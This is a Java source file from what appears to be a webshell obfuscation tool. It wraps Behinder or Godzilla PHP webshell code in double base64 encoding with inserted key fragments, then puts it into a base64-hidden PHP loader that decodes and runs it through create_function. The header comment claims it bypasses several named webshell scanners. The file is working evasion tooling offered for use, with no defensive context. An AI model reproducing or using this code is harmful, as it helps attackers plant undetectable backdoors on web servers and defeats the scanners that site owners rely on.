package encode;

import application.RandomString;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class PhpEncodeDemo4 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;

    public PhpEncodeDemo4() {
    }

    public PhpEncodeDemo4(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }

    public static String GetDemotxt(){

        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-09-13_demo4\n" +
                " * Bypass: 牧云、伏魔、河马在线、河马本地(1.8.2)\n" +
                " * 需php版本 <= 7.1\n" +
                " */";
    }

    public String Run(){

        if(!sourcecode.isEmpty()){
            try {
                sourcecode = sourcecode.replace("<?php", "").replace("?>", "").trim();
                byte[] bytes = sourcecode.getBytes(StandardCharsets.UTF_8);
                String s = Base64.getEncoder().encodeToString(Base64.getEncoder().encode(bytes));
                if(this.key.equals("默认随机")){
                    this.key = RandomString.getRString(8);
                }

                StringBuilder stringBuilder = new StringBuilder(s);
                int aa = new Random().nextInt((stringBuilder.length())/2)+1;
                for (int i = aa;  i > 0; i = new Random().nextInt(i)) {
                    stringBuilder.insert(i,this.key);
                }
                s = stringBuilder.toString();


                String demo1 = "PD9waHAKJHVzZXJuYW1lID0gJyRrZXkkJzsKJHBhc3N3b3JkID0gJyRiYXNlNjRjb2RlJCc7CmhlYWRlcignZGRkZGRkOicuJHVzZXJuYW1lKTsKJGFyciA9IGFwYWNoZV9yZXNwb25zZV9oZWFkZXJzKCk7CiR0ZW1wbGF0ZV9zb3VyY2U9Jyc7CmZvcmVhY2ggKCRhcnIgYXMgJGsgPT4gJHYpIHsKICAgIGlmICgka1swXSA9PSAnZCcgJiYgJGtbNF0gPT0gJ2QnKSB7CiAgICAgICAgJHRlbXBsYXRlX3NvdXJjZSA9IHN0cl9yZXBsYWNlKCR2LCcnLCRwYXNzd29yZCk7CiAgICB9Cn0KJHRlbXBsYXRlX3NvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJHRlbXBsYXRlX3NvdXJjZSk7CiR0ZW1wbGF0ZV9zb3VyY2UgPSBiYXNlNjRfZGVjb2RlKCR0ZW1wbGF0ZV9zb3VyY2UpOwoka2V5ID0gJ3RlbXBsYXRlX3NvdXJjZSc7CiRhZXNfZGVjb2RlPSQka2V5OwokbmV3ZnVuYyA9IGNyZWF0ZV9mdW5jdGlvbignJywgJGFlc19kZWNvZGUpOwokbmV3ZnVuYygpOw==";
                encode = new String(Base64.getDecoder().decode(demo1));

                encode = encode.replace("$key$",this.key);
                encode = encode.replace("$base64code$",s);

                return this.encode;
            }catch (Exception e){
                return "加密失败";
            }
        }else {
            return "请输入冰蝎、哥斯拉PHP源码";
        }

    }
}
